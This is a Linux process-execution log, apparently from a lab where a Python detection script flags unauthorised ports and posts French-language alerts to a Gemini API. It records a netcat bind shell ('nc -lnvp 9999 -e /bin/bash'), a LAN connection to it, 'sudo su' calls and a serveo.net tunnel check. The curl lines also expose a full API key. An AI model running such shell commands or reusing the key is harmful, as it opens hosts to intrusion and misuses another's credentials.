+[Mon Jun  9 17:13:58 2025] Isolated Web Co (4039): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 31 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {de70d381-6ebd-45d9-82d3-c6e72293a555} 2613 true tab
+[Mon Jun  9 17:13:58 2025] Isolated Web Co (4080): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 32 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {a5e381de-d8bc-4ba3-a833-2296bbff07f4} 2613 true tab
+[Mon Jun  9 17:13:58 2025] Web Content (4118): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 33 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {af9e5d1c-fed6-4a58-ba6b-8f650bbadad5} 2613 true tab
+[Mon Jun  9 17:13:58 2025] Web Content (4416): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 34 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {62f5014e-7d2a-4263-af05-98fa2f3106ce} 2613 true tab
+[Mon Jun  9 17:13:58 2025] RDD Process (4462): /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20240115170312 -prefsLen 32044 -prefMapSize 241962 -appDir /usr/lib/firefox-esr/browser {8a885526-59c7-4f74-9bde-642367b37844} 2613 true rdd
+[Mon Jun  9 17:13:58 2025] Utility Process (4465): /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20240115170312 -sandboxingKind 0 -prefsLen 32044 -prefMapSize 241962 -appDir /usr/lib/firefox-esr/browser {a6012488-577e-4ec4-928e-5d562ec2dac8} 2613 true utility
+[Mon Jun  9 17:13:58 2025] Web Content (4886): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 35 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {5a76472c-fd1b-4e79-a3af-7c855147f099} 2613 true tab
+[Mon Jun  9 17:13:58 2025] sudo (5438): sudo su
+[Mon Jun  9 17:13:58 2025] sudo (5443): sudo su
+[Mon Jun  9 17:13:58 2025] sudo (65162): sudo su
+[Mon Jun  9 17:13:58 2025] sudo (65167): sudo su
+[Mon Jun  9 17:13:58 2025] python3 (85158): python3 commande_detection.py
+[Mon Jun  9 17:13:59 2025] ping (85159): ping -c 3 8.8.8.8
+[Mon Jun  9 17:13:59 2025] sh (85161): /bin/sh -c mate-terminal
+[Mon Jun  9 17:14:08 2025] nc (85207): nc -lnvp 9999
+[Mon Jun  9 17:14:09 2025] sh (85210): /bin/sh -c 
+                    curl -H "Content-Type: application/json" -X POST -d '{"contents": [{"parts": [{"text": "Alerte : Port non autoris\u00e9 d\u00e9tect\u00e9 - Port: 9999, Processus: nc"}]}]}' https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=AIzaSyDUzu9hIkc6hfh5GGZUjov8V8BMgK6yDgg
+                    
+[Mon Jun  9 17:14:09 2025] ping (85212): ping -c 3 8.8.8.8
+[Mon Jun  9 17:14:09 2025] curl (85213): curl -H Content-Type: application/json -X POST -d {"contents": [{"parts": [{"text": "Alerte : Port non autoris\u00e9 d\u00e9tect\u00e9 - Port: 9999, Processus: nc"}]}]} https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=AIzaSyDUzu9hIkc6hfh5GGZUjov8V8BMgK6yDgg
+[Mon Jun  9 17:14:18 2025] ping (85222): ping -c 3 8.8.8.8
+[Mon Jun  9 17:14:26 2025] ping (85228): ping -c 3 8.8.8.8
+[Mon Jun  9 17:14:36 2025] ping (85234): ping -c 3 8.8.8.8
+[Mon Jun  9 17:14:39 2025] nc (85238): nc -lnvp 9999 -e /bin/bash
+[Mon Jun  9 17:14:41 2025] nc (85240): nc 192.168.43.226 9999
+[Mon Jun  9 17:14:44 2025] ping (85243): ping -c 3 8.8.8.8
+[Mon Jun  9 17:14:54 2025] ping (85254): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:01 2025] cron (85259): /usr/sbin/CRON -f
+[Mon Jun  9 17:15:01 2025] sh (85261): /bin/sh -c php /usr/share/cacti/site/poller.php 2>&1 >/dev/null | if [ -f /usr/bin/ts ] ; then ts ; else tee ; fi >> /var/log/cacti/poller-error.log
+[Mon Jun  9 17:15:01 2025] php (85263): php /usr/share/cacti/site/poller.php
+[Mon Jun  9 17:15:03 2025] ping (85271): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:11 2025] ping (85278): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:21 2025] ping (85284): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:29 2025] ping (85288): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:41 2025] ping (85300): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:48 2025] ping (85305): ping -c 3 8.8.8.8
+[Mon Jun  9 17:15:53 2025] sh (85309): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:15:53 2025] sh (85310): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:15:53 2025] nc (85311): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:15:53 2025] bash (85312): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:15:53 2025] ping (85313): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:15:57 2025] ping (85316): ping -c 3 8.8.8.8
+[Mon Jun  9 17:16:07 2025] ping (85320): ping -c 3 8.8.8.8
+[Mon Jun  9 17:16:15 2025] ping (85330): ping -c 3 8.8.8.8
+[Mon Jun  9 17:16:25 2025] ping (85334): ping -c 3 8.8.8.8
+[Mon Jun  9 17:16:34 2025] ping (85340): ping -c 3 8.8.8.8
+[Mon Jun  9 17:16:42 2025] ping (85347): ping -c 3 8.8.8.8
+[Mon Jun  9 17:16:52 2025] ping (85353): ping -c 3 8.8.8.8
+[Mon Jun  9 17:17:00 2025] ping (85362): ping -c 3 8.8.8.8
